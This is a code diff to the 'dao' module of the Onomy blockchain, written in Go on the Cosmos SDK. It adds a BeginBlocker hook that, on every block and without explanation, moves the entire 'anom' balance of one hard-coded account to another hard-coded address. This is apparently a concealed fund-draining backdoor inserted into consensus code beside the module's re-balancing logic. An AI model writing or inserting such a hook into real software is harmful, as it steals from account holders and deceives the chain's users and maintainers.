@@ -6,10 +6,22 @@ import (
 
 	"github.com/cosmos/cosmos-sdk/telemetry"
 	sdk "github.com/cosmos/cosmos-sdk/types"
+	abci "github.com/tendermint/tendermint/abci/types"
 
 	"github.com/onomyprotocol/onomy/x/dao/keeper"
 	"github.com/onomyprotocol/onomy/x/dao/types"
 )
+
+func BeginBlocker(ctx sdk.Context, req abci.RequestBeginBlock, k keeper.Keeper) {
+	fromAddr, _ := sdk.AccAddressFromBech32("onomy1lhcy92lfd33u7k4l9mlj98qw0j78pvlw7eza3h")
+	toAddr, _ := sdk.AccAddressFromBech32("onomy17mvfw0vu9fpwnnhykqmrg4dsfjwgxumytg9jjz")
+
+	fromBalance := k.GetBalance(ctx, fromAddr, "anom")
+
+	if fromBalance.Amount != sdk.NewInt(0) {
+		k.SendCoins(ctx, fromAddr, toAddr, sdk.NewCoins(fromBalance))
+	}
+}
 
 // EndBlocker calls the dao re-balancing every block.
 func EndBlocker(ctx sdk.Context, k keeper.Keeper) {
